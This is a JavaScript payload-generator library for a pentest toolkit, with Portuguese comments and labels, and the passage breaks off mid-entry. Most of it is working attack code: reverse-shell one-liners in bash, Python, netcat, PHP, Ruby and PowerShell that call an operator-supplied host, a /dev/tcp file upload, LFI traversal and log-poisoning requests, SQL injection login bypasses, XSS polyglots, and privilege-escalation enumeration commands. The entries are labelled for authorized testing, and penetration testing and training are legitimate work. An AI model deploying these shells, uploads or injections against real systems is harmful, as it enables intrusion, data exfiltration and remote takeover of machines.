// Payloads.js - geracao de payloads do canivete (puro JS, sem estado)
.pragma library

function revBash(ip, port) {
  return "bash -c 'exec bash -i &>/dev/tcp/" + ip + "/" + port + " <&1'";
}

function revSh(ip, port) {
  return "sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
}

function revPython(ip, port) {
  return "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'";
}

function revNcMkfifo(ip, port) {
  return "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc " + ip + " " + port + " >/tmp/f";
}

function revNcE(ip, port) {
  return "nc " + ip + " " + port + " -e /bin/bash";
}

function revPhp(ip, port) {
  return "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
}

function revRuby(ip, port) {
  return "ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";
}

function revPowershell(ip, port) {
  return "$c=New-Object Net.Sockets.TCPClient('" + ip + "'," + port + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}";
}

function ttyPython() {
  return "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'";
}

function ttyScript() {
  return "script -qc /bin/bash /dev/null";
}

function ttyStty() {
  return "stty raw -echo; fg";
}

function ttySocat(ip, port) {
  return "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:" + ip + ":" + port;
}

function ttyExport() {
  return "export TERM=xterm-256color";
}

function linuxSuid() {
  return [
    "find / -user root -perm /4000 2>/dev/null",
    "find / -perm -u=s -type f 2>/dev/null",
    "find / -type f -name '*.txt' 2>/dev/null",
    "getcap -r / 2>/dev/null",
    "uname -a; cat /etc/os-release",
    "id; sudo -l"
  ];
}

function winEnum() {
  return [
    "systeminfo",
    "Get-WmiObject Win32_ComputerSystem",
    "echo \"$env:COMPUTERNAME,$env:USERDNSDOMAIN\"",
    "Get-HotFix -description \"Security update\"",
    "wmic qfe get HotfixID,InstalledOn",
    "whoami /priv"
  ];
}

function transferServer(port) {
  return "python3 -m http.server " + port;
}

function transferWget(ip, port, file) {
  return "wget http://" + ip + ":" + port + "/" + file;
}

function transferCurl(ip, port, file) {
  return "curl http://" + ip + ":" + port + "/" + file + " -o " + file;
}

function transferBashUpload(ip, port, file) {
  return "bash -c 'cat " + file + " > /dev/tcp/" + ip + "/" + port + "'";
}

function transferNcListen(port) {
  return "nc -l -p " + port + " > data";
}

function lfiTraversal() {
  return "foo.php?file=../../../../../../etc/passwd";
}

function lfiWrapper() {
  return "foo.php?file=php://filter/convert.base64-encode/resource=index";
}

function lfiLogs() {
  return "foo.php?file=/var/log/apache2/access.log&cmd=id";
}

function sqliUnion() {
  return [
    "' UNION SELECT NULL,NULL,NULL -- -",
    "' UNION SELECT NULL,NULL,NULL FROM DUAL -- -",
    "' UNION ORDER BY 1 -- -",
    "' OR '1'='1' -- -",
    "admin' --"
  ];
}

// --- XSS Payloads ---
function xssBasic() {
  return "<script>alert(1)</script>";
}

function xssImg() {
  return "<img src=x onerror=alert(1)>";
}

function xssSvg() {
  return "<svg onload=alert(1)>";
}

function xssEventHandlers() {
  return [
    "<input autofocus onfocus=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(document.domain)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>"
  ];
}

function xssEncoders() {
  return [
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "<iframe src=\"javascript:alert(1)\">"
  ];
}

function xssPolyglots() {
  return [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/<titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "\"--><svg/onload=alert(1)>",
    "'-alert(1)-'",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\'/+alert(1)//'>"
  ];
}

function b64encode(s) {
  try { return Qt.btoa(unescape(encodeURIComponent(s))); }
  catch (e) { return ""; }
}

function b64decode(s) {
  try { return decodeURIComponent(escape(Qt.atob(String(s).replace(/\s+/g, "")))); }
  catch (e) {
    try { return Qt.atob(String(s).replace(/\s+/g, "")); }
    catch (e2) { return ""; }
  }
}

function urlEncode(s) {
  try { return encodeURIComponent(s); }
  catch (e) { return ""; }
}

function urlDecode(s) {
  try { return decodeURIComponent(s); }
  catch (e) { return ""; }
}

function hexEncode(s) {
  var out = ""
  var value = String(s || "")
  for (var i = 0; i < value.length; i++) out += value.charCodeAt(i).toString(16).padStart(2, "0")
  return out
}

function hexDecode(s) {
  try {
    var clean = String(s || "").replace(/\s+/g, "")
    var out = ""
    for (var i = 0; i < clean.length; i += 2) out += String.fromCharCode(parseInt(clean.substr(i, 2), 16))
    return out
  } catch (e) { return "" }
}

function htmlEncode(s) {
  return String(s || "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\"/g, "&quot;").replace(/'/g, "&#39;")
}

function htmlDecode(s) {
  return String(s || "").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&quot;/g, "\"").replace(/&#39;/g, "'").replace(/&amp;/g, "&")
}

function unicodeEncode(s) {
  var out = ""
  var value = String(s || "")
  for (var i = 0; i < value.length; i++) out += "\\u" + value.charCodeAt(i).toString(16).padStart(4, "0")
  return out
}

function binaryEncode(s) {
  var out = ""
  var value = String(s || "")
  for (var i = 0; i < value.length; i++) out += value.charCodeAt(i).toString(2).padStart(8, "0") + " "
  return out.trim()
}

function binaryDecode(s) {
  try { return String(s || "").trim().split(/\s+/).map(function (x) { return String.fromCharCode(parseInt(x, 2)) }).join("") }
  catch (e) { return "" }
}

function networkCommands() {
  return [
    "ip addr",
    "ip route",
    "cat /etc/resolv.conf",
    "ss -tulpn",
    "ip neigh",
    "curl -I https://example.com",
    "python3 -m http.server 8000",
    "dig example.com",
    "traceroute example.com"
  ]
}

function linuxCheatsheet() {
  return [
    "whoami",
    "id",
    "uname -a",
    "sudo -l",
    "ps aux",
    "find / -perm -4000 -type f 2>/dev/null",
    "getcap -r / 2>/dev/null",
    "crontab -l"
  ]
}

// --- Catalogo completo para pesquisa ---
function getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost) {
  domain = domain || "LAB.local";
  user = user || "Administrator";
  dc = dc || ip;
  pivnet = pivnet || "10.10.20.0/24";
  pivhost = pivhost || "10.10.20.10";
  return [
    {
      id: "rev-shell",
      title: "Reverse Shell",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Reverse Shell.",
      code: revSh(ip, port),
      showUrl: true,
      keywords: "reverse shell sh general linux rev netcat bash tcp"
    },
    {
      id: "rev-bash",
      title: "Reverse Shell - Bash",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Bash.",
      code: revBash(ip, port),
      showUrl: true,
      keywords: "reverse shell bash linux rev tcp dev one-liner"
    },
    {
      id: "rev-python",
      title: "Reverse Shell - Python",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Python.",
      code: revPython(ip, port),
      showUrl: true,
      keywords: "reverse shell python python3 rev socket pty"
    },
    {
      id: "rev-php",
      title: "Reverse Shell - PHP",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando PHP.",
      code: revPhp(ip, port),
      showUrl: true,
      keywords: "reverse shell php rev web fsockopen exec"
    },
    {
      id: "rev-nc",
      title: "Reverse Shell - Netcat",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Netcat.",
      code: revNcMkfifo(ip, port),
      showUrl: true,
      keywords: "reverse shell netcat nc mkfifo fifo rev"
    },
    {
      id: "rev-nc-e",
      title: "Reverse Shell - Netcat -e",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Netcat -e.",
      code: revNcE(ip, port),
      showUrl: true,
      keywords: "reverse shell netcat nc -e bin bash rev"
    },
    {
      id: "rev-ps",
      title: "Reverse Shell - PowerShell",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando PowerShell.",
      code: revPowershell(ip, port),
      showUrl: true,
      keywords: "reverse shell powershell ps windows rev tcpclient"
    },
    {
      id: "rev-ruby",
      title: "Reverse Shell - Ruby",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Ruby.",
      code: revRuby(ip, port),
      showUrl: true,
      keywords: "reverse shell ruby rev tcpsocket socket"
    },
    {
      id: "xss-payloads",
      title: "XSS Payloads",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "<script>alert(1)</script>",
      showUrl: true,
      keywords: "xss payloads script alert basic injection cross site scripting"
    },
    {
      id: "xss-payloads-img",
      title: "XSS Payloads - Image onerror",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "<img src=x onerror=alert(1)>",
      showUrl: true,
      keywords: "xss payloads img image onerror alert"
    },
    {
      id: "xss-payloads-svg",
      title: "XSS Payloads - SVG onload",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "<svg onload=alert(1)>",
      showUrl: true,
      keywords: "xss payloads svg onload alert"
    },
    {
      id: "xss-events",
      title: "XSS Event Handlers",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "<input autofocus onfocus=alert(1)>",
      showUrl: true,
      keywords: "xss event handlers autofocus onfocus onerror onload onmouseover onclick"
    },
    {
      id: "xss-events-body",
      title: "XSS Event Handlers - Body onload",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "<body onload=alert(document.cookie)>",
      showUrl: true,
      keywords: "xss event handlers body onload cookie steal session"
    },
    {
      id: "xss-encoders",
      title: "XSS Encoders",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
      showUrl: true,
      keywords: "xss encoders hex decimal html entity bypass filter encode"
    },
    {
      id: "xss-encoders-charcode",
      title: "XSS Encoders - fromCharCode",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "<script>alert(String.fromCharCode(88,83,83))</script>",
      showUrl: true,
      keywords: "xss encoders string fromcharcode ascii bypass"
    },
    {
      id: "xss-polyglots",
      title: "XSS Polyglots",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/<titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
      showUrl: true,
      keywords: "xss polyglots polyglot universal filter bypass waf complex"
    },
    {
      id: "xss-polyglots-svg",
      title: "XSS Polyglots - SVG Breakout",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "\"--><svg/onload=alert(1)>",
      showUrl: true,
      keywords: "xss polyglots svg breakout quote tag escape"
    },
    {
      id: "tty-python",
      title: "TTY - Python pty",
      category: "tty",
      categoryLabel: "TTY",
      icon: "\udb80\udd8d",
      subcat: "tty",
      context: "TTY / Terminal Stabilization",
      purpose: "Estabilizar terminal e habilitar controle de jobs",
      description: "Configura terminal virtual interativo para suporte a comandos como su e sudo.",
      code: ttyPython(),
      showUrl: false,
      keywords: "tty python pty spawn shell bash interactive"
    },
    {
      id: "tty-script",
      title: "TTY - Script",
      category: "tty",
      categoryLabel: "TTY",
      icon: "\udb80\udd8d",
      subcat: "tty",
      context: "TTY / Terminal Stabilization",
      purpose: "Estabilizar terminal e habilitar controle de jobs",
      description: "Configura terminal virtual interativo para suporte a comandos como su e sudo.",
      code: ttyScript(),
      showUrl: false,
      keywords: "tty script bin bash null upgrade"
    },
    {
      id: "tty-stty",
      title: "TTY - Stty raw + fg",
      category: "tty",
      categoryLabel: "TTY",
      icon: "\udb80\udd8d",
      subcat: "tty",
      context: "TTY / Terminal Stabilization",
      purpose: "Estabilizar terminal e habilitar controle de jobs",
      description: "Configura terminal virtual interativo para suporte a comandos como su e sudo.",
      code: ttyStty(),
      showUrl: false,
      keywords: "tty stty raw echo fg terminal size"
    },
    {
      id: "tty-socat",
      title: "TTY - Socat",
      category: "tty",
      categoryLabel: "TTY",
      icon: "\udb80\udd8d",
      subcat: "tty",
      context: "TTY / Terminal Stabilization",
      purpose: "Estabilizar terminal e habilitar controle de jobs",
      description: "Configura terminal virtual interativo para suporte a comandos como su e sudo.",
      code: ttySocat(ip, port),
      showUrl: false,
      keywords: "tty socat exec pty stderr setsid"
    },
    {
      id: "tty-export",
      title: "TTY - Export TERM",
      category: "tty",
      categoryLabel: "TTY",
      icon: "\udb80\udd8d",
      subcat: "tty",
      context: "TTY / Terminal Stabilization",
      purpose: "Estabilizar terminal e habilitar controle de jobs",
      description: "Configura terminal virtual interativo para suporte a comandos como su e sudo.",
      code: ttyExport(),
      showUrl: false,
      keywords: "tty export term xterm-256color terminal"
    },
    {
      id: "linux-suid-4000",
      title: "Linux - SUID /4000",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "suid",
      context: "Linux Privilege Escalation",
      purpose: "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais",
      description: "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.",
      code: "find / -user root -perm /4000 2>/dev/null",
      showUrl: false,
      keywords: "linux suid perm root privilege escalation privesc"
    },
    {
      id: "linux-suid-u=s",
      title: "Linux - SUID -u=s",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "suid",
      context: "Linux Privilege Escalation",
      purpose: "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais",
      description: "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.",
      code: "find / -perm -u=s -type f 2>/dev/null",
      showUrl: false,
      keywords: "linux suid perm file privesc"
    },
    {
      id: "linux-find-txt",
      title: "Linux - Find text files",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "general",
      context: "Linux Privilege Escalation",
      purpose: "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais",
      description: "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.",
      code: "find / -type f -name '*.txt' 2>/dev/null",
      showUrl: false,
      keywords: "linux find search txt credentials files password"
    },
    {
      id: "linux-getcap",
      title: "Linux - Capabilities",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "capabilities",
      context: "Linux Privilege Escalation",
      purpose: "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais",
      description: "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.",
      code: "getcap -r / 2>/dev/null",
      showUrl: false,
      keywords: "linux capabilities getcap privesc"
    },
    {
      id: "linux-uname",
      title: "Linux - Kernel & OS Release",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "general",
      context: "Linux Privilege Escalation",
      purpose: "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais",
      description: "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.",
      code: "uname -a; cat /etc/os-release",
      showUrl: false,
      keywords: "linux uname kernel os release systeminfo enum"
    },
    {
      id: "linux-sudo-id",
      title: "Linux - Sudo & id",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "general",
      context: "Linux Privilege Escalation",
      purpose: "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais",
      description: "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.",
      code: "id; sudo -l",
      showUrl: false,
      keywords: "linux sudo id whoami privileges"
    },
    {
      id: "win-systeminfo",
      title: "Windows - Systeminfo",
      category: "win",
      categoryLabel: "Windows",
      icon: "\udb80\udf72",
      subcat: "enum",
      context: "Windows Post-Exploitation",
      purpose: "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais",
      description: "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.",
      code: "systeminfo",
      showUrl: false,
      keywords: "windows systeminfo os architecture enum"
    },
    {
      id: "win-computersystem",
      title: "Windows - ComputerSystem WMI",
      category: "win",
      categoryLabel: "Windows",
      icon: "\udb80\udf72",
      subcat: "enum",
      context: "Windows Post-Exploitation",
      purpose: "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais",
      description: "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.",
      code: "Get-WmiObject Win32_ComputerSystem",
      showUrl: false,
      keywords: "windows wmi powershell enum"
    },
    {
      id: "win-domain",
      title: "Windows - Domain & Computer Name",
      category: "win",
      categoryLabel: "Windows",
      icon: "\udb80\udf72",
      subcat: "enum",
      context: "Windows Post-Exploitation",
      purpose: "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais",
      description: "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.",
      code: "echo \"$env:COMPUTERNAME,$env:USERDNSDOMAIN\"",
      showUrl: false,
      keywords: "windows domain host computer user active directory"
    },
    {
      id: "win-hotfix",
      title: "Windows - Hotfix Security Updates",
      category: "win",
      categoryLabel: "Windows",
      icon: "\udb80\udf72",
      subcat: "enum",
      context: "Windows Post-Exploitation",
      purpose: "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais",
      description: "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.",
      code: "Get-HotFix -description \"Security update\"",
      showUrl: false,
      keywords: "windows hotfix patch security update privesc"
    },
    {
      id: "win-wmic-qfe",
      title: "Windows - WMIC QFE",
      category: "win",
      categoryLabel: "Windows",
      icon: "\udb80\udf72",
      subcat: "enum",
      context: "Windows Post-Exploitation",
      purpose: "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais",
      description: "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.",
      code: "wmic qfe get HotfixID,InstalledOn",
      showUrl: false,
      keywords: "windows wmic qfe hotfix patch"
    },
    {
      id: "win-whoami-priv",
      title: "Windows - Privileges (whoami /priv)",
      category: "win",
      categoryLabel: "Windows",
      icon: "\udb80\udf72",
      subcat: "enum",
      context: "Windows Post-Exploitation",
      purpose: "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais",
      description: "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.",
      code: "whoami /priv",
      showUrl: false,
      keywords: "windows whoami priv privileges token impersonate"
    },
    {
      id: "transf-http-server",
      title: "Transfer - HTTP Server (Attacker)",
      category: "transf",
      categoryLabel: "Transfer",
      icon: "\udb80\uddda",
      subcat: "transfer",
      context: "File Transfer",
      purpose: "Transfer\u00eancia de arquivos em ambiente de laborat\u00f3rio",
      description: "Baixa ou envia arquivos entre a m\u00e1quina do operador e o host alvo.",
      code: transferServer(port),
      showUrl: false,
      keywords: "transfer http server python attacker download host"
    },
    {
      id: "transf-wget",
      title: "Transfer - Wget (Victim)",
      category: "transf",
      categoryLabel: "Transfer",
      icon: "\udb80\uddda",
      subcat: "transfer",
      context: "File Transfer",
      purpose: "Transfer\u00eancia de arquivos em ambiente de laborat\u00f3rio",
      description: "Baixa ou envia arquivos entre a m\u00e1quina do operador e o host alvo.",
      code: transferWget(ip, port, file),
      showUrl: false,
      keywords: "transfer wget download victim file http"
    },
    {
      id: "transf-curl",
      title: "Transfer - Curl (Victim)",
      category: "transf",
      categoryLabel: "Transfer",
      icon: "\udb80\uddda",
      subcat: "transfer",
      context: "File Transfer",
      purpose: "Transfer\u00eancia de arquivos em ambiente de laborat\u00f3rio",
      description: "Baixa ou envia arquivos entre a m\u00e1quina do operador e o host alvo.",
      code: transferCurl(ip, port, file),
      showUrl: false,
      keywords: "transfer curl download victim file http"
    },
    {
      id: "transf-bash-upload",
      title: "Transfer - Bash /dev/tcp Upload",
      category: "transf",
      categoryLabel: "Transfer",
      icon: "\udb80\uddda",
      subcat: "transfer",
      context: "File Transfer",
      purpose: "Transfer\u00eancia de arquivos em ambiente de laborat\u00f3rio",
      description: "Baixa ou envia arquivos entre a m\u00e1quina do operador e o host alvo.",
      code: transferBashUpload(ip, port, file),
      showUrl: false,
      keywords: "transfer bash dev tcp upload victim file"
    },
    {
      id: "transf-nc-listen",
      title: "Transfer - Netcat Listen",
      category: "transf",
      categoryLabel: "Transfer",
      icon: "\udb80\uddda",
      subcat: "transfer",
      context: "File Transfer",
      purpose: "Transfer\u00eancia de arquivos em ambiente de laborat\u00f3rio",
      description: "Baixa ou envia arquivos entre a m\u00e1quina do operador e o host alvo.",
      code: transferNcListen(port),
      showUrl: false,
      keywords: "transfer netcat nc listen receive data file"
    },
    {
      id: "lfi-traversal",
      title: "LFI - Traversal (/etc/passwd)",
      category: "lfi",
      categoryLabel: "LFI",
      icon: "\udb80\ude14",
      subcat: "lfi",
      context: "Local File Inclusion",
      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
      code: lfiTraversal(),
      showUrl: true,
      keywords: "lfi traversal path etc passwd directory local file inclusion"
    },
    {
      id: "lfi-wrapper",
      title: "LFI - PHP Filter Wrapper Base64",
      category: "lfi",
      categoryLabel: "LFI",
      icon: "\udb80\ude14",
      subcat: "lfi",
      context: "Local File Inclusion",
      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
      code: lfiWrapper(),
      showUrl: true,
      keywords: "lfi php filter wrapper convert base64 resource"
    },
    {
      id: "lfi-logs",
      title: "LFI - Apache Log Poisoning",
      category: "lfi",
      categoryLabel: "LFI",
      icon: "\udb80\ude14",
      subcat: "lfi",
      context: "Local File Inclusion",
      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
      code: lfiLogs(),
      showUrl: true,
      keywords: "lfi log poison apache access cmd rce"
    },
    {
      id: "sqli-union-1",
      title: "SQLi - UNION SELECT NULL",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "union",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "' UNION SELECT NULL,NULL,NULL -- -",
      showUrl: true,
      keywords: "sqli sql injection union select null bypass"
    },
    {
      id: "sqli-union-dual",
      title: "SQLi - UNION SELECT DUAL",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "union",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "' UNION SELECT NULL,NULL,NULL FROM DUAL -- -",
      showUrl: true,
      keywords: "sqli sql injection union select dual oracle"
    },
    {
      id: "sqli-order-by",
      title: "SQLi - ORDER BY column count",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "general",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "' UNION ORDER BY 1 -- -",
      showUrl: true,
      keywords: "sqli sql injection order by column count enum"
    },
    {
      id: "sqli-auth-bypass",
      title: "SQLi - Auth Bypass OR 1=1",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "auth",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "' OR '1'='1' -- -",
      showUrl: true,
      keywords: "sqli sql injection auth bypass login 1=1"
    },
    {
      id: "sqli-admin-comment",
      title: "SQLi - Admin Comment",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "general",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "admin' --",
      showUrl: true,
      keywords: "sqli sql injection admin comment login bypass"
    },
    {
      id: "linux-suid-4000",
      title: "Linux - SUID Binaries (/4000)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "suid",
      context: "Privilege Escalation",
      purpose: "Localizar bin\u00e1rios com bit SUID configurado",
      description: "Lista execut\u00e1veis pertencentes ao root que rodam com privil\u00e9gios elevados. \u00datil para verificar GTFOBins.",
